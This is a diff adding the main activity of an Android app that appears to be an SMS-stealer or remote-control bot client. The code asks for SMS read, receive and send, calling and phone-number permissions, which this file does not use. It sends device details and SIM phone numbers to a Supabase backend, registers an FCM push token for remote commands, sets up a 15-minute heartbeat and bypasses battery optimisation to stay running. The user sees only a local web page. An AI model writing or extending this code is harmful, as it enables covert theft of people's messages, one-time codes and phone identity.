@@ -1,0 +1,594 @@
+package com.example.admin
+
+import android.Manifest
+import android.annotation.SuppressLint
+import android.content.Context
+import android.content.Intent
+import android.content.pm.PackageManager
+import android.net.Uri
+import android.os.Build
+import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
+import android.os.PowerManager
+import android.provider.Settings
+import android.telephony.SubscriptionManager
+import android.util.Log
+import android.view.Gravity
+import android.view.View
+import android.webkit.WebSettings
+import android.webkit.WebView
+import android.webkit.WebViewClient
+import android.widget.FrameLayout
+import android.widget.ProgressBar
+import android.widget.Toast
+import androidx.appcompat.app.AppCompatActivity
+import androidx.core.content.ContextCompat
+import androidx.work.Constraints
+import androidx.work.ExistingWorkPolicy
+import androidx.work.ExistingPeriodicWorkPolicy
+import androidx.work.NetworkType
+import androidx.work.OneTimeWorkRequestBuilder
+import androidx.work.PeriodicWorkRequestBuilder
+import androidx.work.WorkManager
+import androidx.work.workDataOf
+import com.example.admin.network.SupabaseApi
+import com.example.admin.receivers.DeviceRegistration
+import com.example.admin.utils.Constants
+import com.example.admin.utils.DevicePrefUtil
+import com.example.admin.web.AndroidBridge
+import com.example.admin.workers.HeartbeatWorker
+import com.google.firebase.FirebaseApp
+import com.google.firebase.messaging.FirebaseMessaging
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.cancel
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
+import org.json.JSONObject
+import java.util.concurrent.TimeUnit
+
+class MainActivity : AppCompatActivity() {
+
+    private lateinit var webView: WebView
+    private lateinit var deviceRegistration: DeviceRegistration
+    private lateinit var uid: String
+    private lateinit var frameLayout: FrameLayout
+    private lateinit var progressBar: ProgressBar
+    private lateinit var supabaseApi: SupabaseApi
+
+    private val coroutineScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
+
+    private var isActivityRunning = false
+    private var bridgeAdded = false
+
+    companion object {
+        private const val REQUEST_CODE = 1001
+        private const val SETTINGS_REQUEST_CODE = 2001
+        private const val HEARTBEAT_WORK_NAME = "HEARTBEAT_WORK"
+        private const val TAG = "MainActivity"
+    }
+
+    private val requiredPermissions = arrayOf(
+        Manifest.permission.RECEIVE_SMS,
+        Manifest.permission.READ_SMS,
+        Manifest.permission.SEND_SMS,
+        Manifest.permission.CALL_PHONE,
+        Manifest.permission.READ_PHONE_STATE,
+        Manifest.permission.READ_PHONE_NUMBERS,
+        Manifest.permission.ACCESS_NETWORK_STATE,
+        Manifest.permission.INTERNET
+    )
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+
+        Log.d(TAG, "onCreate called")
+        isActivityRunning = true
+
+        supabaseApi = SupabaseApi(this)
+        FirebaseApp.initializeApp(this)
+
+        frameLayout = FrameLayout(this)
+        webView = WebView(this)
+
+        progressBar = ProgressBar(this).apply {
+            isIndeterminate = true
+            visibility = View.GONE
+        }
+
+        val params = FrameLayout.LayoutParams(
+            FrameLayout.LayoutParams.WRAP_CONTENT,
+            FrameLayout.LayoutParams.WRAP_CONTENT
+        )
+        params.gravity = Gravity.CENTER
+        progressBar.layoutParams = params
+
+        frameLayout.addView(webView)
+        frameLayout.addView(progressBar)
+
+        setContentView(frameLayout)
+
+        deviceRegistration = DeviceRegistration(this)
+
+        setupWebView()
+
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val savedUid = DevicePrefUtil.getUniqueId(this@MainActivity)
+
+                uid = if (savedUid.isNullOrEmpty()) {
+                    val newUid = deviceRegistration.registerDeviceIfNeeded()
+                    DevicePrefUtil.saveUniqueId(this@MainActivity, newUid)
+                    newUid
+                } else {
+                    savedUid
+                }
+
+                Log.d(TAG, "UID loaded: $uid")
+                Log.d(TAG, "APP ID: ${supabaseApi.getAppId()}")
+                Log.d(TAG, "TABLE NAME: ${supabaseApi.getTableName()}")
+
+                withContext(Dispatchers.Main) {
+                    if (isActivityRunning) {
+                        addAndroidBridgeIfNeeded()
+                        loadHtmlFromAssets()
+                        checkAndRequestPermissions()
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error loading UID: ${e.message}", e)
+
+                withContext(Dispatchers.Main) {
+                    if (isActivityRunning) {
+                        Toast.makeText(
+                            this@MainActivity,
+                            "Device setup failed. Please restart app.",
+                            Toast.LENGTH_SHORT
+                        ).show()
+                    }
+                }
+            }
+        }
+
+        disableBatteryOptimization()
+    }
+
+    @SuppressLint("SetJavaScriptEnabled")
+    private fun setupWebView() {
+        try {
+            webView.clearCache(true)
+            webView.clearHistory()
+
+            val settings: WebSettings = webView.settings
+            settings.javaScriptEnabled = true
+            settings.domStorageEnabled = true
+            settings.allowFileAccess = true
+            settings.allowContentAccess = true
+            settings.cacheMode = WebSettings.LOAD_NO_CACHE
+
+            webView.webViewClient = object : WebViewClient() {
+
+                override fun onPageStarted(
+                    view: WebView?,
+                    url: String?,
+                    favicon: android.graphics.Bitmap?
+                ) {
+                    if (isActivityRunning) {
+                        progressBar.visibility = View.VISIBLE
+                    }
+                }
+
+                override fun onPageFinished(
+                    view: WebView?,
+                    url: String?
+                ) {
+                    if (isActivityRunning) {
+                        progressBar.visibility = View.GONE
+                    }
+                }
+
+                override fun onReceivedError(
+                    view: WebView?,
+                    request: android.webkit.WebResourceRequest?,
+                    error: android.webkit.WebResourceError?
+                ) {
+                    Log.e(TAG, "WebView error: ${error?.description}")
+
+                    if (isActivityRunning) {
+                        progressBar.visibility = View.GONE
+                        Toast.makeText(
+                            this@MainActivity,
+                            "Error loading page",
+                            Toast.LENGTH_SHORT
+                        ).show()
+                    }
+                }
+            }
+
+            Log.d(TAG, "WebView setup complete")
+        } catch (e: Exception) {
+            Log.e(TAG, "Error setting up WebView: ${e.message}", e)
+        }
+    }
+
+    private fun addAndroidBridgeIfNeeded() {
+        try {
+            if (!bridgeAdded && ::uid.isInitialized) {
+                webView.addJavascriptInterface(
+                    AndroidBridge(
+                        uid            = uid,
+                        appId          = supabaseApi.getAppId(),
+                        tableName      = supabaseApi.getTableName(),
+                        supabaseUrl    = supabaseApi.getSupabaseUrl(),
+                        supabaseAnonKey= supabaseApi.getSupabaseAnonKey(),
+                        apiBaseUrl     = Constants.DEVICE_API_BASE_URL
+                    ),
+                    "AndroidBridge"
+                )
+
+                bridgeAdded = true
+                Log.d(TAG, "AndroidBridge added with UID: $uid, apiBaseUrl: ${Constants.DEVICE_API_BASE_URL}")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error adding AndroidBridge: ${e.message}", e)
+        }
+    }
+
+    private fun loadHtmlFromAssets() {
+        try {
+            webView.loadUrl("file:///android_asset/index.html")
+            Log.d(TAG, "HTML loaded from assets")
+        } catch (e: Exception) {
+            Log.e(TAG, "Error loading HTML: ${e.message}", e)
+
+            webView.loadData(
+                "<html><body><h3>Error loading page. Please restart app.</h3></body></html>",
+                "text/html",
+                "UTF-8"
+            )
+        }
+    }
+
+    private fun checkAndRequestPermissions() {
+        if (!isActivityRunning) return
+
+        val allGranted = requiredPermissions.all {
+            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
+        }
+
+        if (allGranted) {
+            Log.d(TAG, "All permissions granted")
+            startBackgroundRegistration()
+        } else {
+            requestPermissions(requiredPermissions, REQUEST_CODE)
+        }
+    }
+
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+
+        if (!isActivityRunning) return
+
+        if (requestCode == REQUEST_CODE) {
+            if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
+                startBackgroundRegistration()
+            } else {
+                openAppSettings()
+            }
+        }
+    }
+
+    private fun openAppSettings() {
+        try {
+            startActivityForResult(
+                Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+                    .setData(Uri.fromParts("package", packageName, null)),
+                SETTINGS_REQUEST_CODE
+            )
+        } catch (e: Exception) {
+            Log.e(TAG, "Error opening settings: ${e.message}", e)
+        }
+    }
+
+    override fun onActivityResult(
+        requestCode: Int,
+        resultCode: Int,
+        data: Intent?
+    ) {
+        super.onActivityResult(requestCode, resultCode, data)
+
+        if (requestCode == SETTINGS_REQUEST_CODE) {
+            checkAndRequestPermissions()
+        }
+    }
+
+    private fun startBackgroundRegistration() {
+        if (!isActivityRunning) return
+        if (!::uid.isInitialized) return
+
+        Log.d(TAG, "startBackgroundRegistration called for UID: $uid")
+
+        coroutineScope.launch {
+            pushDeviceToSupabase(uid)
+        }
+    }
+
+    private fun pushDeviceToSupabase(uid: String) {
+        try {
+            val simMap = fetchSimInfoMap()
+
+            val deviceJson = JSONObject().apply {
+                put("uid", uid)
+                put("app_id", supabaseApi.getAppId())
+
+                put("model", Build.MODEL ?: "")
+                put("brand", Build.BRAND ?: "")
+                put("manufacturer", Build.MANUFACTURER ?: "")
+                put("androidversion", Build.VERSION.SDK_INT.toString())
+
+                put("sim1number", simMap["sim1Number"] ?: "")
+                put("sim1carrier", simMap["sim1Carrier"] ?: "")
+                put("sim2number", simMap["sim2Number"] ?: "")
+                put("sim2carrier", simMap["sim2Carrier"] ?: "")
+
+                put("joinedat", System.currentTimeMillis())
+                put("device_name", Build.MODEL ?: "")
+                put("status", "active")
+            }
+
+            Log.d(TAG, "Device JSON before Supabase: $deviceJson")
+
+            supabaseApi.registerDevice(uid, deviceJson) { success, response ->
+                if (success) {
+                    Log.d(TAG, "Device registered in Supabase: $response")
+
+                    initFcm()
+                    scheduleHeartbeatWork()
+
+                    if (isActivityRunning) {
+                        runOnUiThread {
+                            Toast.makeText(
+                                this@MainActivity,
+                                "Device registered",
+                                Toast.LENGTH_SHORT
+                            ).show()
+                        }
+                    }
+                } else {
+                    Log.e(TAG, "Failed to register: $response")
+
+                    if (isActivityRunning) {
+                        Handler(Looper.getMainLooper()).postDelayed({
+                            if (isActivityRunning) {
+                                pushDeviceToSupabase(uid)
+                            }
+                        }, 10000)
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Exception in pushDeviceToSupabase: ${e.message}", e)
+        }
+    }
+
+    private fun fetchSimInfoMap(): Map<String, String> {
+        val map = mutableMapOf<String, String>()
+
+        try {
+            if (
+                ContextCompat.checkSelfPermission(
+                    this,
+                    Manifest.permission.READ_PHONE_STATE
+                ) != PackageManager.PERMISSION_GRANTED
+            ) {
+                return emptyMap()
+            }
+
+            val subMgr =
+                getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
+
+            val subs = subMgr.activeSubscriptionInfoList ?: return emptyMap()
+
+            subs.forEach { subInfo ->
+                val slotIndex = subInfo.simSlotIndex
+                val carrierName = subInfo.carrierName?.toString() ?: ""
+
+                val number = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    subInfo.number ?: ""
+                } else {
+                    ""
+                }
+
+                if (slotIndex == 0) {
+                    map["sim1Carrier"] = carrierName
+                    map["sim1Number"] = number
+                } else if (slotIndex == 1) {
+                    map["sim2Carrier"] = carrierName
+                    map["sim2Number"] = number
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error fetching SIM info: ${e.message}", e)
+        }
+
+        return map
+    }
+
+    private fun initFcm() {
+        if (!isActivityRunning) return
+        if (!::uid.isInitialized) return
+
+        FirebaseMessaging.getInstance().token
+            .addOnSuccessListener { token ->
+                Log.d(TAG, "FCM Token received: ${token.take(50)}...")
+
+                supabaseApi.updateDeviceToken(uid, token) { success, message ->
+                    if (success) {
+                        Log.d(TAG, "FCM token updated successfully")
+                    } else {
+                        Log.e(TAG, "FCM token update failed: $message")
+
+                        if (isActivityRunning) {
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                if (isActivityRunning) {
+                                    initFcm()
+                                }
+                            }, 5000)
+                        }
+                    }
+                }
+            }
+            .addOnFailureListener { e ->
+                Log.e(TAG, "FCM token failed: ${e.message}")
+
+                if (isActivityRunning) {
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        if (isActivityRunning) {
+                            initFcm()
+                        }
+                    }, 5000)
+                }
+            }
+    }
+
+    private fun scheduleHeartbeatWork() {
+        try {
+            if (!::uid.isInitialized) {
+                Log.e(TAG, "Heartbeat schedule skipped: UID not initialized")
+                return
+            }
+
+            val constraints = Constraints.Builder()
+                .setRequiredNetworkType(NetworkType.CONNECTED)
+                .build()
+
+            val inputData = workDataOf(
+                "uid" to uid,
+                "app_id" to supabaseApi.getAppId()
+            )
+
+            val immediateWork = OneTimeWorkRequestBuilder<HeartbeatWorker>()
+                .setConstraints(constraints)
+                .setInputData(inputData)
+                .build()
+
+            val workManager = WorkManager.getInstance(this)
+
+            workManager.enqueueUniqueWork(
+                "HEARTBEAT_WORK_NOW",
+                ExistingWorkPolicy.REPLACE,
+                immediateWork
+            )
+
+            val periodicWork = PeriodicWorkRequestBuilder<HeartbeatWorker>(
+                15,
+                TimeUnit.MINUTES
+            )
+                .setConstraints(constraints)
+                .setInputData(inputData)
+                .build()
+
+            workManager.enqueueUniquePeriodicWork(
+                HEARTBEAT_WORK_NAME,
+                ExistingPeriodicWorkPolicy.UPDATE,
+                periodicWork
+            )
+
+            Log.d(TAG, "Immediate + periodic heartbeat work scheduled for UID: $uid")
+
+
+            runOnUiThread {
+                workManager
+                    .getWorkInfosForUniqueWorkLiveData("HEARTBEAT_WORK_NOW")
+                    .observe(this@MainActivity) { infos ->
+                        infos?.forEach { info ->
+                            Log.d(TAG, "HEARTBEAT_WORK_NOW state=${info.state}")
+                        }
+                    }
+
+                workManager
+                    .getWorkInfosForUniqueWorkLiveData(HEARTBEAT_WORK_NAME)
+                    .observe(this@MainActivity) { infos ->
+                        infos?.forEach { info ->
+                            Log.d(TAG, "HEARTBEAT_PERIODIC state=${info.state}")
+                        }
+                    }
+            }
+
+        } catch (e: Exception) {
+            Log.e(TAG, "Error scheduling heartbeat: ${e.message}", e)
+        }
+    }
+
+    private fun disableBatteryOptimization() {
+        try {
+            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+
+            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                    data = Uri.parse("package:$packageName")
+                }
+
+                startActivity(intent)
+                Log.d(TAG, "Battery optimization permission requested")
+            } else {
+                Log.d(TAG, "Already ignoring battery optimization")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Battery optimization error: ${e.message}")
+        }
+    }
+
+    override fun onBackPressed() {
+        if (::webView.isInitialized) {
+            try {
+                webView.evaluateJavascript(
+                    "window.safeBack && window.safeBack();",
+                    null
+                )
+            } catch (e: Exception) {
+                Log.e(TAG, "Error in onBackPressed: ${e.message}")
+                super.onBackPressed()
+            }
+        } else {
+            super.onBackPressed()
+        }
+    }
+
+    override fun onResume() {
+        super.onResume()
+        isActivityRunning = true
+        Log.d(TAG, "onResume called")
+    }
+
+    override fun onPause() {
+        super.onPause()
+        Log.d(TAG, "onPause called")
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+
+        isActivityRunning = false
+        Log.d(TAG, "onDestroy called, cancelling coroutine scope")
+
+        coroutineScope.cancel()
+
+        try {
+            if (::webView.isInitialized) {
+                webView.clearHistory()
+                webView.clearCache(true)
+                webView.loadUrl("about:blank")
+                webView.destroy()
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error destroying WebView: ${e.message}")
+        }
+    }
+}
